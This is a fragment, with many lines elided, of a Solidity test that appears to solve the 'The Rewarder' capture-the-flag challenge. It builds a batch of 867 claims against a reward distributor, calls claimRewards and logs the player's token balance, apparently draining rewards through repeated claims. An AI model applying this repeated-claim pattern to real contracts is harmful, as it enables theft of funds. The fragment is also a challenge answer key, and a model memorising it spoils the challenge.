...
contract TheRewarderChallenge is Test {
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        uint256 playerClaim1 = 11524763827831882;
        uint256 playerClaim2 = 1171088749244340;
        ...
        // Create Alice's claims
        Claim[] memory claims1 = new Claim[](867);
        ...
        distributor.claimRewards({inputClaims: claims1, inputTokens: tokensToClaim});
        ...
        console.log(dvt.balanceOf(player)/1e18);
